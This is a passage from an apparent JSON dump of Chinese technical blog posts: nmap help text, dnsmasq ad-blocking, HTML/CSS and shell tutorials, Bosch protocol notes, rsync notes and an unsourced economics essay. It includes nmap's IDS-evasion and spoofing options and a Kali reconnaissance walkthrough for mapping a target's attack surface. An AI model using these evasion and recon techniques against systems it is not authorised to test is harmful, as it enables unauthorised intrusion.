DETECTION:\n  -O: Enable OS detection\n  --osscan-limit: Limit OS detection to promising targets\n  --osscan-guess: Guess OS more aggressively\nTIMING AND PERFORMANCE:\n  Options which take time are in seconds, or append 'ms' (milliseconds),\n  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).\n  -T0-5: Set timing template (higher is faster)\n  --min-hostgroup/max-hostgroup size: Parallel host scan group sizes\n  --min-parallelism/max-parallelism numprobes: Probe parallelization\n  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout time: Specifies\n      probe round trip time.\n  --max-retries tries: Caps number of port scan probe retransmissions.\n  --host-timeout time: Give up on target after this long\n  --scan-delay/--max-scan-delay time: Adjust delay between probes\n  --min-rate number: Send packets no slower than number per second\n  --max-rate number: Send packets no faster than number per second\nFIREWALL/IDS EVASION AND SPOOFING:\n  -f; --mtu val: fragment packets (optionally w/given MTU)\n  -D decoy1,decoy2[,ME],...: Cloak a scan with decoys\n  -S IPAddress: Spoof source address\n  -e iface: Use specified interface\n  -g/--source-port portnum: Use given port number\n  --proxies url1,[url2],...: Relay connections through HTTP/SOCKS4 proxies\n  --data hex string: Append a custom payload to sent packets\n  --data-string string: Append a custom ASCII string to sent packets\n  --data-length num: Append random data to sent packets\n  --ip-options options: Send packets with specified ip options\n  --ttl val: Set IP time-to-live field\n  --spoof-mac mac address/prefix/vendor name: Spoof your MAC address\n  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum\nOUTPUT:\n  -oN/-oX/-oS/-oG file: Output scan in normal, XML, s|","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 中国经济真相","title":"中国经济真相","text":"近来，网络上流传的有关中国经济的真相越来越多，不同业界的人士从不同的角度，不同的视野一探中国经济的真实现状。\n\n储蓄真相。\n\n储蓄率高达50%左右，居世界第一，但居民储蓄率只是20%左右。\n\n中国最近几年储蓄率在50%左右，居世界第一，但居民储蓄率只是20%左右。储蓄高主要表现在政府和企业而非居民。国民储蓄分三部分，一般国家都以居民储蓄为首，然后是企业储蓄、政府储蓄，而中国的储蓄结构却相反。\n\n统计显示，从1992年到2012年，中国国民储蓄率从35%升到了59%，其中，政府储蓄率和企业储蓄率翻了一番，但居民储蓄率却没有变，1992年为20%，2012年依然是20%。\n\n内需不足真相。\n\n中国社会的收入增长并没有最大可能地分配给老百姓，而是最大可能地分配给了政府和资本所有者（资本家），老百姓手里没钱，而政府投资带动的消费少得可怜。\n\n以新疆为例，新疆是一个资源大省，堪比中东的很多国家，按道理当地人民应该很富裕。但事实恰恰相反，新疆很穷。可见，一个有资源的地方并不见得能因此发展起来，这取决于政府是否真正把老百姓的收入和利益放在第一位。\n\n房价上涨真相。\n\n近来一线城市和部分二线城市房价暴涨，上海数百套百万豪宅一天售罄。\n\n有媒体披露一些有房子的人是借机套现，转移资金，这些有豪宅的人先抬高自己的房价，然后和自己的保姆、司机等商量好，给他们开出高收入证明，替他们付了首付，然后让他们从银行贷款买房套现，这些保姆、司机或者自己的熟人等先搬入豪宅，老板先付几个月的月供，等老板把钱转移走以后，房子就交给银行了。\n\n这就是深圳、上海房价疯涨的原因之一。\n\n金融真相。\n\n物价一直在涨，A股一直在跌。\n\nCPI（消费者物价指数）是随着中国经济的增长而增长的，而A股也是中国经济的晴雨表。现在有意思的是：中国的CPI不断攀升，可A股指却越来越低，两者完全不吻合。究其本质，是中国金融系统的不完善，金融是最高层次的经济调控，一旦不完善引发的怪相就太多了。\n\n产业真相。\n\n实体产业被掏空，虚拟产业在猛增。\n\n搞实体的越来越少，玩金融、互联网、配资等虚拟产业的越来越多。实体基础决定上层建筑，一个社会究竟需要多少人在上层配置资源，这是看它的实体产业有多丰厚。而现在大量人才都涌向虚拟产业，于是出现了大量泡沫，比如P2P、融资投资、配资炒房等各种投机现象，所以中国正在空心化。\n\n税收真相。\n\n穷人越缴越多，富人越缴越少。\n\n中国的个人所得税是按照薪资多少分级的，但是工薪阶层恰恰是中国最穷的一部分人。中国富人的资产很少以薪资为主，往往以股票、股权、债券、房产等为主，很多还有灰色收入，并且他们可以通过各种手段避税，但是工薪阶层就束手无策了。因此，中国要想调控贫富差距，必须想办法深入其资产领域，而不是如何设置缴税门槛。\n\n商品真相。\n\n工厂卖不出自己产品，消费者买不到称心产品。\n\n中国工厂习惯于“薄利多销”，然而随着同质化竞争，现在连“薄利”的底线都兜不住了。可是工厂效益越不好，越容易采取“低价竞争”策略，这是一个恶性循环，结果生产的产品越来越满足不了消费者的需求，于是现在两头空。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 DNSMasq","title":"Linux命令 DNSMasq","text":"规则如下，广告过滤地址可以自己添加修改，网上找的，小弟整理了一下，希望能和大家多多交流交流，共同分享：\nDNSmasq规则\n\n编辑 /etc/dnsmasq.conf，加入下面一条配置：\nadd dnsmasq.ads rule list\nconf-dir=/etc/dnsmasq.d\naddn-hosts=/etc/dnsmasq.d/simpleu.txt\n记得在etc文件夹下新建一个名字为dnsmasq.d的文件夹，以免配置不正确，然后命令行运行以下批处理即可更新过滤规则，可以添加到定时任务脚本或者开机启动脚本里面，方便自动更新，以下为自动更新命令：\nwget --no-check-certificate -qO - https://easylist-downloads.adblockplus.org/chinalist+easylist.txt | grep ^\\|\\|\\^$ | sed -e 's:||:address\\=\\/:' -e 's:\\^:/127\\.0\\.0\\.1:'   /etc/dnsmasq.d/chinalist+easylist.conf\nwget --no-check-certificate -qO - http://winhelp2002.mvps.org/hosts.txt | \\\nawk '{if(/^/||/^$/) {print $0} else {print \"address=/\"$2\"/\"$1\"\\t\"$3,\"\\n\"\"server=/\"$2\"/#\"}}'   /etc/dnsmasq.d/mvps.conf\nwget --no-check-certificate -qO - http://someonewhocares.org/hosts/hosts | \\\nawk '{if(/^#/||/^$/) {print $0} else {print \"address=/\"$2\"/\"$1\"\\t\"$3,\"\\n\"\"server=/\"$2\"/#\"}}'   /etc/dnsmasq.d/someonewhocares.conf\nwget --no-check-certificate -qO - http://www.malwaredomainlist.com/hostslist/hosts.txt | \\\nawk '{if(/^#/||/^$/) {print $0} else {print \"address=/\"$2\"/\"$1\"\\t\"$3,\"\\n\"\"server=/\"$2\"/#\"}}'   /etc/dnsmasq.d/malwaredomainlist.conf\nwget --no-check-certificate -qO - https://raw.githubusercontent.com/vokins/simpleu/master/hosts   /etc/dnsmasq.d/simpleu.txt\n/etc/init.d/dnsmasq restart\n`","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-24 前端开发-Html5","title":"前端开发 Html5","text":"CSS 参考手册\n菜鸟教程\n\nHTML5 视频\nvideo\n  source src=\"movie.webm\" type='video/webm; codecs=\"vp8, vorbis\"' /\n  source src=\"movie.mp4\" type='video/mp4; codecs=\"avc1.42E01E, mp4a.40.2\"' /\n  Video tag not supported. Download the video a href=\"movie.webm\"here/a.\nvideo\n\nul  unordered lists\nol\tordered lists\n\n基础 \t \n!DOCTYPE  \t定义文档类型。\nhtml \t定义一个 HTML 文档\ntitle \t为文档定义一个标题\nbody \t定义文档的主体\nh1 to h6 \t定义 HTML 标题\np \t定义一个段落\nbr \t定义简单的折行。\nhr \t定义水平线。\n!--...-- \t定义一个注释\n格式 \t \nacronym \tHTML5不再支持。 定义只取首字母的缩写。\nabbr \t定义一个缩写。\naddress \t定义文档作者或拥有者的联系信息。\nb \t定义粗体文本。\nbdiNew \t允许您设置一段文本，使其脱离其父元素的文本方向设置。\nbdo \t定义文本的方向。\nbig \tHTML5不再支持。 定义大号文本。\nblockquote \t定义块引用。\ncite \t定义引用(citation)。\ncode \t定义计算机代码文本。\ndel \t定义被删除文本。\ndfn \t定义定义项目。\nem \t定义强调文本。\ni \t定义斜体文本。\nins \t定义被插入文本。\nkbd \t定义键盘文本。\nmarkNew \t定义带有记号的文本。\nmeterNew \t定义度量衡。仅用于已知最大和最小值的度量。\npre \t定义预格式文本\nprogressNew \t定义运行中的任务进度（进程）。\nq \t定义短的引用。\nrpNew \t定义不支持 ruby 元素的浏览器所显示的内容。\nrtNew \t定义字符（中文注音或字符）的解释或发音。\nrubyNew \t定义 ruby 注释（中文注音或字符）。\ns \t定义加删除线的文本。\nsamp \t定义计算机代码样本。\nsmall \t定义小号文本。\nstrong \t定义语气更为强烈的强调文本。\nsub \t定义下标文本。\nsup \t定义上标文本。\ntimeNew \t定义一个日期/时间\nu \t定义下划线文本。\nvar \t定义文本的变量部分。\nwbrNew \t规定在文本中的何处适合添加换行符。\n表单 \t \nform \t定义一个 HTML 表单，用于用户输入。\ninput \t定义一个输入控件\ntextarea \t定义多行的文本输入控件。\nbutton \t定义按钮。\nselect \t定义选择列表（下拉列表）。\noptgroup \t定义选择列表中相关选项的组合。\noption \t定义选择列表中的选项。\nlabel \t定义 input 元素的标注。\nfieldset \t定义围绕表单中元素的边框。\nlegend \t定义 fieldset 元素的标题。\ndatalistNew \t规定了 input 元素可能的选项列表。\nkeygenNew \t规定用于表单的密钥对生成器字段。\noutputNew \t定义一个计算的结果\n框架 \t \nframe \tHTML5不再支持。 定义框架集的窗口或框架。\nframeset \tHTML5不再支持。定义框架集。\nnoframes \tHTML5不再支持。 定义针对不支持框架的用户的替代内容。\niframe \t定义内联框架。\n图像 \t \nimg \t定义图像。\nmap \t定义图像映射。\narea \t定义图像地图内部的区域。\ncanvasNew \t通过脚本（通常是 JavaScript）来绘制图形（比如图表和其他图像）。\nfigcaptionNew \t定义一个 caption for a figure element\nfigureNew \tfigure 标签用于对元素进行组合。\nAudio/Video \t \naudioNew \t定义声音，比如音乐或其他音频流。\nsourceNew \t定义media元素 (video 和 audio)的媒体资源。media\ntrackNew \t为媒体(video 和 audio)元素定义外部文本轨道。\nvideoNew \t定义一个音频或者视频\n链接 \t \na \t定义一个链接\nlink \t定义文档与外部资源的关系。\nnavNew \t定义导航链接\n列表 \t \nul \t定义一个无序列表\nol \t定义一个有序列表\nli \t定义一个列表项\ndl \t定义一个定义列表\ndt \t定义一个定义定义列表中的项目。\ndd \t定义定义列表中项目的描述。\nmenu \t定义菜单列表。\ncommandNew \t定义用户可能调用的命令（比如单选按钮、复选框或按钮）。\n表格 \t \ntable \t定义一个表格\ncaption \t定义表格标题。\nth \t定义表格中的表头单元格。\ntr \t定义表格中的行。\ntd \t定义表格中的单元。\nthead \t定义表格中的表头内容。\ntbody \t定义表格中的主体内容。\ntfoot \t定义表格中的表注内容（脚注）。\ncol \t定义表格中一个或多个列的属性值。\ncolgroup \t定义表格中供格式化的列组。\n样式/节 \t \nstyle \t定义文档的样式信息。\ndiv \t定义文档中的节。\nspan \t定义文档中的节。\nheaderNew \t定义一个文档头部部分\nfooterNew \t定义一个文档底部\nsectionNew \t定义了文档的某个区域\narticleNew \t定义一个文章内容\nasideNew \t定义其所处内容之外的内容。\ndetailsNew \t定义了用户可见的或者隐藏的需求的补充细节。\ndialogNew \t定义一个对话框或者窗口\nsummaryNew \t定义一个可见的标题。 当用户点击标题时会显示出详细信息。\n元信息 \t \nhead \t定义关于文档的信息\nmeta \t定义关于 HTML 文档的元信息。\nbase \t定义页面中所有链接的默认地址或默认目标。\nbasefont \tHTML5不再支持。 HTML 4.01 已废弃。 定义页面中文本的默认字体、颜色或尺寸。\n程序 \t \nscript \t定义客户端脚本。\nnoscript \t定义针对不支持客户端脚本的用户的替代内容。\napplet \tHTML5不再支持。 HTML 4.01 已废弃。 定义嵌入的 applet。\nembedNew \t定义了一个容器，用来嵌入外部应用或者互动程序（插件）。\nobject \t定义嵌入的对象。\nparam \t定义对象的参数。","tags":null},{"location":"//blog.pytool.com/Hacker/01_信息搜集/2016-03-29 Kali Linux信息收集之bing-ip2hosts","title":"Kali Linux信息收集之bing-ip2hosts","text":"0x00 bing-ip2hosts介绍\n\nBing.com是微软拥有的以前称为MSN搜索和实时搜索的搜索引擎。它具有搜索在特定IP地址上的网站的独特功能。 Bing-ip2hosts使用此功能枚举Bing已为特定IP地址编入索引的所有主机名。这种技术被认为是在渗透测试的信息收集阶段的最佳方法，以便可以发现更大的潜在攻击面。 Bing-ip2hosts是用Linux上的Bash脚本语言编写的，因为使用移动接口的缘故，所以不需要API密钥。\n\n工具来源：http://www.morningstarsecurity.com/research/bing-ip2hosts\n\nbing-ip2hosts主页 | Kali bing-ip2hosts Repo仓库\n\n    作者：Andrew Horton\n    证书：GPLv3\n\n0x01 bing-ip2hosts功能\n\nbing-ip2hosts - 使用bing.com枚举给定IP的主机名\n\nroot@kali:~# bing-ip2hosts -h\nbing-ip2hosts (o.4) by Andrew Horton aka urbanadventurer\nHomepage: http://www.morningstarsecurity.com/research/bing-ip2hosts\n\n在渗透测试中的Web情报收集和攻击层面映射虚拟主机很有用\n查找与目标共享IP地址的主机名，可以是主机名或IP地址\n利用Microsoft Bing.com的能力通过IP地址搜索，例如：“IP：210.48.71.196”\n用法: /usr/bin/bing-ip2hosts [选项] IP地址|主机名\n\n选项:\n-n       关闭进度指示动画\n-t DIR 使用指定目录而不是/tmp目录，该目录必须存在\n-i       可选CSV输出，在每行上输出IP和主机名，以逗号分隔\n-p       可选http：//前缀输出，方便在shell中右键单击打开\n0x02 bing-ip2hosts用法示例\n\nroot@kali:~# bing-ip2hosts -p -t /root/test microsoft.com\n[ 65.55.58.201 | Scraping 1 | Found 0 | / ]\nhttp://microsoft.com\nhttp://research.microsoft.com\nhttp://www.answers.microsoft.com\nhttp://www.microsoft.com\nhttp://www.msdn.microsoft.com\n\nroot@kali:~# bing-ip2hosts -p -t /root/test 173.194.33.80\n[ 173.194.33.80 | Scraping 60-69 of 73 | Found 41 | | ]| / ]\nhttp://asia.google.com\nhttp://desktop.google.com\nhttp://ejabat.google.com\nhttp://google.netscape.com\nhttp://partner-client.google.com\nhttp://picasa.google.com\n0x03 提示\n\n最新的Kali已经移除了bing-ip2hosts，如果要使用bing-ip2hosts可以使用以下命令获取并安装：\n\nroot@kali:~# wget https://raw.githubusercontent.com/Strubbl/dotfiles/master/bin/bing-ip2hosts\nroot@kali:~# chmod +x bing-ip2hosts\nroot@kali:~# mv bing-ip2hosts /usr/bin/","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-04-the-first-day-talk-about-opacity","title":"第一天，谈谈【透明】","text":"提到透明，大家首先会想到opacity。先来看测试用例一：\n\n    .case{\n\t\t/省略无关样式/\n\t\tbackground-color: red;\n\t\topacity: 0.5;\n\t}\n\n在支持opacity的浏览器里效果如下：\n\nopacity的兼容性如下图：\n\n在不支持opacity的IE6、7、8中效果如下：\n\n为了兼容IE6、7、8，需要使用filter:alpha(opacity=..)，来看测试用例二：\n\n    .case{\n\t\t/省略无关样式/\n\t\tbackground-color: red;\n\t\tfilter:alpha(opacity=50);/ for IE8 and earlier /\n\t\topacity: 0.5;/ for IE9 and other browsers /\n\t}\n\n在IE6中效果如下，（IE7、8也相同）\n\n但是opacity会引起一些副作用，来看测试用例三：\n\n    .case{\n\t\t/省略无关样式/\n\t\tbackground-color: red;\n\t\tfilter:alpha(opacity=50);\n\t\topacity: 0.5;\n\t}\n\t.inner{\n\t\t/省略无关样式/\n\t\tbackground-color: blue;\n\t\tcolor: #000;\n\t}\n\n效果如下：（仔细看，最内层元素里是有文字的）\n\n可以看到，透明元素包含的子元素也透明了，尽管已经将子元素的color设置为#000，但文字还是透明到看不清楚。\n\n这很可能不是你想要的效果，那么为了避免子元素受影响，我们需要用到CSS3提供的RGBA(R,G,B,A)，\n通过最后的参数A（Alpha通道），可以设置元素的透明度。测试用例四：\n\n    .case{\n\t\t/省略无关样式/\n\t\tborder:1px solid #000;\n\t\tbackground:rgba(255,0,0,0.5);\n\t}\n\n显示效果如下：\n\n但是在IE6、7、8中显示如下：\n\nRGBA(R,G,B,A)的兼容性如下：\n\n为了兼容IE6、7、8，我们需要用到DXImageTransform.Microsoft.gradient滤镜，来看测试用例五：\n\n    .case{\n\t\t/省略无关样式/\n\t\tborder:1px solid #000;\n\t\tfilter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#7FFF0000', endColorstr='#7FFF0000');\n\t\tbackground:rgba(255,0,0,0.5);\n\t}\n\n此时在IE6中效果如下：\n\n简单解释下：要给DXImageTransform.Microsoft.gradient滤镜设置起点色（startColorstr）和终点色（endColorstr），在此我们只想让它透明而无需渐变，只需让起点色和终点色相同。需要注意的是，它们的取值是一个八位的十六进制值，前两位表示alpha通道值，00表示完全透明，FF表示完全不透明；后六位则是这个颜色的RGB值。\n\n我们再次给透明元素添加一个子元素，测试用例六：\n\n    .case{\n\t\t/省略无关样式/\n\t\tborder:1px solid #000;\n\t\tfilter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#7FFF0000', endColorstr='#7FFF0000');\n\t\tbackground:rgba(255,0,0,0.5);\n\t}\n    .inner {\n\t\t/省略无关样式/\n\t\tcolor: #000;\n\t\tbackground-color: blue;\n\t}\n\n效果如下：（IE7、8相同）\n\n但是IE9却稍有不同，如下：\n\n我们可以发现，在IE9中透明元素的颜色与其他浏览器稍有偏差，原因我们以后再探究。\n\n为了保险起见，我们还可以增加一个fallback（后备）颜色，也就是不透明时的颜色，如果某个浏览器不支持透明，就会显示这个颜色。代码如下：\n\n    .case{\n\t\t/省略无关样式/\n\t\tborder:1px solid #000;\n\t\tbackground-color: #ff0000;\n\t\tfilter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#7FFF0000', endColorstr='#7FFF0000');\n\t\tbackground-color:rgba(255,0,0,0.5);\n\t}\n\n但是惊奇的发现，增加后备颜色后，在IE6、7下显示正常，在IE8下却不正常了。\n\n这里需要一个小技巧，需要在样式里增加一条background:transparent，再看IE8效果：\n\n至于为什么background:transparent会有这样的效果，我们后面再探究。\n\n至此我们可以总结下，使元素透明的样式可以这样写：（颜色替换成你需要的）\n\n  推荐一个小工具：css 背景颜色属性值转换\n\n    .case{\n\t\t/省略无关样式/\n\t\tbackground-color: #ff0000;\n\t\tbackground: transparent;\n\t\tfilter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#7FFF0000', endColorstr='#7FFF0000');\n\t\tbackground-color:rgba(255,0,0,0.5);\n\t}\n\n在写上文的过程中，发现需要展开写的地方有很多，比方说：RGBA(R,G,B,A)，不仅仅可以用来背景透明，还有其它好多用途。还有filter也值得展开说说，突然觉得transparent好深奥，也得深入下。O(∩∩)O哈哈~，没关系，慢慢来，后面会把它们一一展开。\n\n那接下来准备谈谈RGBA(R,G,B,A)\n\n  [1]: http://htmljs.b0.upaiyun.com/uploads/1386064479852-opacity-chrome.PNG\n  [2]: http://htmljs.b0.upaiyun.com/uploads/1386064578091-opacity-compatible.PNG\n  [3]: http://htmljs.b0.upaiyun.com/uploads/1386064563208-opacity-ie7.PNG\n  [4]: http://htmljs.b0.upaiyun.com/uploads/1386064597909-opacity-ie6-fixed.PNG\n  [5]: http://htmljs.b0.upaiyun.com/uploads/1386065298517-opacity-chrome-inner.PNG\n  [6]: http://htmljs.b0.upaiyun.com/uploads/1386067853879-rgba-chrome.PNG\n  [7]: http://htmljs.b0.upaiyun.com/uploads/1386068008168-rgba-ie6.PNG\n  [8]: http://htmljs.b0.upaiyun.com/uploads/1386069036901-rgba-compatible.PNG\n  [9]: http://htmljs.b0.upaiyun.com/uploads/1386069432168-rgba-ie6-fixed.PNG\n  [10]: http://htmljs.b0.upaiyun.com/uploads/1386071571127-rgba-ie6-fixed-inner.PNG\n  [11]: http://htmljs.b0.upaiyun.com/uploads/1386071754786-rgba-ie9-fixed-inner.PNG\n  [12]: http://htmljs.b0.upaiyun.com/uploads/1386075487197-rgba-ie6-fixed-inner-fallback.PNG\n  [13]: http://htmljs.b0.upaiyun.com/uploads/1386075793104-rgba-ie7-fixed-inner-fallback.PNG\n  [14]: http://htmljs.b0.upaiyun.com/uploads/1386075523993-rgba-ie8-fixed-inner-fallback.PNG\n  [15]: http://htmljs.b0.upaiyun.com/uploads/1386075742193-rgba-ie8-fixed-inner-fallback-fixed.PNG\n","tags":null},{"location":"//blog.pytool.com/Post/shell/Shell常用招式大全入门篇","title":"Shell常用招式大全-入门篇","text":"---\n采用source 而不是bash 命令 可以将环境变量传递过去\n\n本教程分为入门篇，命令篇和实战篇，结合平时工作中使用Shell的经验编写。以实例为主，侧重于应用，总结了一些实用的技巧。\n\n以下为本教程的《入门篇》，适于初学者快速入门以及老手查缺补漏。\n\n[TOC]\n\n第一招 HelloWorld\n\n  第一式：echo\n\necho \"Hello World\"\n\necho -n \"Hello World\"    # 不带换行\necho -e '\\e[0;33;1mHello\\e[0m World'   # 带颜色的玩法\necho -e '\\e[0;33;4mHello\\e[0m World'   # 带颜色+下划线\necho -e '\\e[0;33;5mHello\\e[0m World'   # 带颜色+闪烁\n格式为 \\e背景色;前景色;高亮格式m，请阅读[详细文档后使用正确的姿势进行装逼。\n\n第二招 判断\n\n 第一式：if\n\nif true\nthen\n    echo \"Hello World\"\nelse\n\techo \"Bug\"\nfi\n\nif false\nthen\n    echo \"Hello World\"\nelif true\nthen\n    echo \"Bug\"\nelse\n\techo \"Bee\"\nfi\n\n判断原理\n\nif、elif会执行它后面跟着的命令，然后看返回值是否为0，如果为0则执行then下面的语句块，否则执行else下面的语句块。\n[casheywen@ubuntu:~]$ true\n[casheywen@ubuntu:~]$ echo $?\n0\n[casheywen@ubuntu:~]$ false\n[casheywen@ubuntu:~]$ echo $?\n1\n  注：\n    1. true、false事实上也为一个命令，true的返回码必为0，false的返回码必为1\n  2. $?为shell内置变量，用于存放上一个命令的返回码\n\n 第二式：test、[ ] 和 [[ ]]\n\ntest、[ ]、[[ ]]实际上都是shell中的命令，执行之后会返回1或0，而这几个命令与if相结合可以达到我们所需要的许多判断功能，例如测试字符串是否为空的三种写法：\n\ns=\"\"\nif [ -z ${s} ]\nthen\n    echo \"empty\"\nfi\n\nif [[ -z ${s} ]]\nthen\n    echo \"empty\"\nfi\n\nif test -z ${s}\nthen\n    echo \"empty\"\nfi\n事实上，if后的  ]、[[  ]]、test命令都是可以单独执行的，而根据if的[判断原理，后续执行哪个分支也是由[  ]、[[  ]]、test的返回值来决定的，以下是单独执行它们的效果：\n[casheywen@ubuntu:~]$ s=\"\"\n[casheywen@ubuntu:~]$ [ -z \"${s}\" ]\n[casheywen@ubuntu:~]$ echo $?\n0\n[casheywen@ubuntu:~]$ s=\"abc\"\n[casheywen@ubuntu:~]$ test -z \"${s}\"\n[casheywen@ubuntu:~]$ echo $?\n1\n[casheywen@ubuntu:~]$ s=\"123\"\n[casheywen@ubuntu:~]$ [[ 100 -lt ${s} ]]\n[casheywen@ubuntu:~]$ echo $?\n0\n\n在性能方面[ ]和test性能基本相同，[[ ]]性能是最高的，为前两者的5倍左右（以-d运算符测试），所以建议尽量使用[[ ]]提高脚本性能。\n\n文件测试\n\n|运算符|描述|示例|\n|","tags":null},{"location":"//blog.pytool.com/Hardware/车联网/2017-02-04 BOSCH协议解析","title":"BOSCH协议解析","text":"BOSCH协议是BOSCH公司开发的一种通信协议，符合ISO9141标准。下面从物理层特性、系统进入、帧结构、命令交互、交互时间参数、常用命令字等几个方面来介绍这种协议。\nØ  物理层特性：空闲电平通常为12V；数据位格式为1+8+1，没有校验位。本协议的波特率在进入系统后确定。确定方法如下：\n进入系统时，Ecu接到Tools以5bps的波特率发送的地址码后，向Tools发送 0X55H，Tools通过计算0X55H的波特率，并把此波特率做为Tools的通讯波特率，并且在整个通讯过程中，波特率固定不变。\nØ  系统进入初始化：\n本协议使用K、L的方式通讯，因此，需要用K线和L 线进行触发，唤醒Ecu，进入系统，具体步骤如下：\nu  Tools在K、L线上同时以5bps的波特率发送地址码，以进入地址码所对应的系统。\nu  关闭L线；\nu  Tools等待接收Ecu回送0X55H，接到后计算出0X55H的波特率并设置通讯波率；\nu  Tools继续接收Ecu发送的Keyword 1和Keyword 2，在接收到Keyword2后，延时20ms将Keyword2取反发回给ECU。\nu  在整个系统进入过程中Tools接收一个byte最长等待时间为2s。若系统进入有错误必须保证通讯线上有3s的时间无任何数据传输，确保Ecu已经是睡眠状态，再按以上步骤重新触发，进入系统。\nu  Ecu接收到求反的 Keyword2后，将发送第一帧系统信息，并在收到链路保持命令继续（03h,xxh,09h,03h）时按顺序发送其它系统信息。\nu  系统信息的解释与读取系统版本信息同。\nu  系统初始化请见下图：\n\n                         图2-5-1\n\nØ  帧结构：\n\n长度 \t记数字节 \t命令字 \t数据区 \t结束标志\n长度:1个字节，表示本命令中长度字节后跟随的字节数。\n记数字节：命令计数器，1个字节，每一条命令都会在上一条命令的命令记数字节基础上加1，作为本次通信数据的命令记数值，以保证接收发送的连续性校验。\n命令字：1个字节，表明所要做的操作。\n数据区：附加信息，若干字节不定。\n结束标志：固定以03H为Request命令的结束符。\n举例如下：\n04H  01H  29H  01H  03H\n第一个字节04H为长度信息\n第二个字节01H为命令计数器\n第三个字节29H为命令字，表示读取数据流\n第四个字节01H为附加信息，表示读取通道01的数据\n最后一个字节03H为结束标志\nØ  命令交互：在命令交互过程中，接收方每接到一个byte，就立即取反发回，直到接收到结束标志为止（注：结束标志0x03不取反发回）。一旦接到结束标志，接收方则可以开始下一帧命令的发送。基本交互模型下图：\n\n                            图 2-5-2\n\n   实际命令如下：\n   Tools：03H  01H  09H  03H\n   ECU：  03H  02H  09H  03H\nØ  交互时间参数：包括4个时间参数，如下：\nECU返回keywod2与设备发送/keyword2的时间间隔：40ms\n设备接收到ECU命令字到发送命令字取反的时间间隔：2ms\n设备发送命令字到ECU发送命令字取反的时间间隔：2ms\n设备发送完一帧命令后等待ECU响应的时间，通常为75ms~90ms\n设备接收到ECU响应后到发送下一帧命令的时间，通常为20ms~26ms\nØ  常用命令字：\n链路保持：09H\n读故障码：07H\n清除故障码：05H\n读版本信息：00H\n读数据流：29H\n系统退出：06H","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 rsync","title":"Linux命令 rsync","text":"---\nrsync 主要定义符及含义\n # %h远程主机名\n # %a远程IP地址\n # %l文件长度字符数\n # %p该次rsync会话的进程id\n # %o操作类型：\"send\"或\"recv\"\n # %f文件名\n # %P模块路径\n # %m模块名\n # %t当前时间\n # %u认证的用户名(匿名时是null)\n # %b实际传输的字节数\n # %c当发送文件时，该字段记录该文件的校验码\n #默认log格式为：\"%o %h [%a] %m (%u) %f %l\"，一般来说,在每行的头上会添加\"%t [%p] \"。\n log format=%o %h [%a] %m (%u) %f %l\n\nrsync 备份备忘 — » Kumu's Blog\nssh root@keyicloud.com\nrsync -avzH /var/www qubuluo.com:/keyi/\nrsync -avzH /var/www/www-data/yiming/ yimengapp.com:/var/www/yimeng/www-data/\nrsync -avzH /var/www/mysql/yiming/ yimengapp.com:/var/www/yimeng/mysql/\n\nrsync -e \"ssh -p 222\" -avzH . root@yimengapp.com:nginx          复制本地文件夹到服务器\nrsync -e \"ssh -p 222\" -avzH git.yimengapp.com:docker/ ~/docker/ 复制服务器文件夹到本地\n\nrsync \"-e ssh -p3009\" -avzH  /usr/local/tomcat8/webapps/websitems-hadoop/ root@114.215.45.96:/docker/tomcat/webapps/websitems/\n允许修改权限\n--super --perms --chmod=0777\n  允许修改所有者 默认修改为本地执行者身份\n--owner --group --chown=www-data:www-data\nrsync --perms  --chmod=0777  --owner --group--chown=www-data:www-data -e \"ssh -p 3009\" --rsync-path=\"sudo rsync\" echo.sh root@d1:\n\nrsync 自动创建目录  -R\nssh user@host mkdir -p dirname $path \u0026\u0026 rsync ...\n转移临沂政府评估 hadoop项目\n rsync \"-e ssh -p3009\" -avzH --exclude 404html/ --exclude ueditor/ --exclude blanktable/ /usr/local/tomcat8/webapps/websitems-hadoop root@118.190.117.111:/docker/tomcat/webapps/websitems-hadoop/\n rsync \"-e ssh -p3009\" -avzH  /usr/local/tomcat8/webapps/websitems-hadoop/ root@114.215.45.111:/docker/tomcat/webapps/websitems/\n\nvi etc/lsyncd.conf\n启动 lsyncd lsyncd.conf\n lsyncd -nodaemon lsyncd.conf\n\nsettings {\n    -- logfile =\"/var/lsyncd.log\",\n    -- statusFile =\"/var/lsyncd.status\",\n    inotifyMode = \"CloseWrite\",\n    maxProcesses = 8,\n    }\n\nsync {\n    default.rsyncssh,\n    source    = \"/home/ubuntu/go/src/github.com/VirrageS/chirp/backend\",\n    host      = \"root@demo.linyibr.com\",\n    targetdir = \"docker/linyibr/bianban/master\",\n    exclude = { 'vendor/','/' , 'file',\".go\", 'lsyncd', \"config.yaml\" ,'api.1.yaml'},\n    -- excludeFrom = \"/etc/rsyncd.d/rsyncexclude.lst\",\n    -- maxDelays = 5,\n    delay = 0,\n    -- init = false,\n    delete \t= \tfalse,\n    rsync    = {\n        binary = \"/usr/bin/rsync\",\n        archive = true,\n        compress = true,\n        verbose   = true,\n        extra = {\"--bwlimit=2000\"},\n        },\n    ssh      = {\n        port  =  222\n        }\n    }\n\n远程服务器创建目录 Forcing Rsync to Create a Remote Path Using –rsync-path\n\nIf you have more than the last leaf directory to be created, you can either run a separate ssh ... mkdir -p first, or use the --rsync-path trick as explained here :\n\nrsync -a --rsync-path=\"mkdir -p /tmp/x/y/z/ \u0026\u0026 rsync\" $source user@remote:/tmp/x/y/z/\n\nOr use the --relative option as suggested by Tony. In that case, you only specify the root of the destination, which must exist, and not the directory structure of the source, which will be created:\n\nrsync -a --relative /new/x/y/z/ user@remote:/preexisting/dir/\n\nThis way, you will end up with /preexisting/dir/new/x/y/z/\n\n一.rsync简介\n    rsync参数的具体解释如下：\n    -h, --help            显示帮助信息\n    -v, --verbose         显示同步过程详细信息\n    -P，--partial          --progress 断点续传\n    -e, --rsh=COMMAND     指定使用rsh、ssh方式进行数据同步\n    -n, --dry-run         显示哪些文件将被传输，只测试输出而不正真执行命令，推荐使用，特别防止 --delete 误删除！\n    -a, --archive         